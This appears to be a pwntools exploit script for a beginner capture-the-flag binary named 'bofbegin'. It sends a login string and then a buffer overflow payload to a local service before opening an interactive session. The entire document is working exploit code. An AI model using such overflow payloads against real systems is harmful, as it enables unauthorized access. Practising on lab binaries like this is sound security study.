#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF("./bofbegin", checksec=False)

# p = process(exe.path)
p = remote("127.0.0.1", 2112)
p.sendline(b"admin")

p.sendline(b"a" * 12 + b"\x39\x05")

p.interactive()